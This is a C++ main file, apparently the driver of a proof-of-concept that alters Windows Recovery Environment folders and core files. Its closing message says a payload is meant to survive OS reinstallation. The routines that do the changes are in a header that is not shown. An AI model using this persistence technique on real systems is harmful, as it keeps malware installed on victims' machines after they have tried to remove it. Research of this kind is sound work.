#include "windefs.h"
#include "winre.hpp"

uint32_t main(void)
{
    auto WinReManagerObj = std::make_unique<WinRe::WinReManager>();
    if (WinReManagerObj.get() == nullptr) {
        std::cout << "EXIT-ERROR: Could not create the WinRe manager object" << std::endl;
        std::exit(1);
    }

    auto data = WinReManagerObj->GetCurrentWinReInformation();
    if (!std::get<0>(data))
    {
        std::cerr << "EXIT-ERROR: WinRE is not enabled in this computer." << std::endl;
        WinReManagerObj.release();
        std::exit(1);
    }
    std::printf("[1] WinRE is currently enabled in the current computer.\n\t"
    "The full partition path where it is located is: %ws\n", std::get<1>(data));
   

    WinReManagerObj->ScanAndSetDirectoryRecovery();
    WinReManagerObj->ScanAndSetCoreFiles();

#ifdef _DEBUG
    std::printf("Values of file status: SetFolder: %d, SetFiles: %d\n", WinReManagerObj->setFolder, WinReManagerObj->setFiles);
#endif 
    
    std::printf("[FINISH] Files and folders have been set as needed for the PoC, test the payload after reinstallation.\n");
    
    WinReManagerObj.release();
    system("pause");
    return EXIT_SUCCESS;
}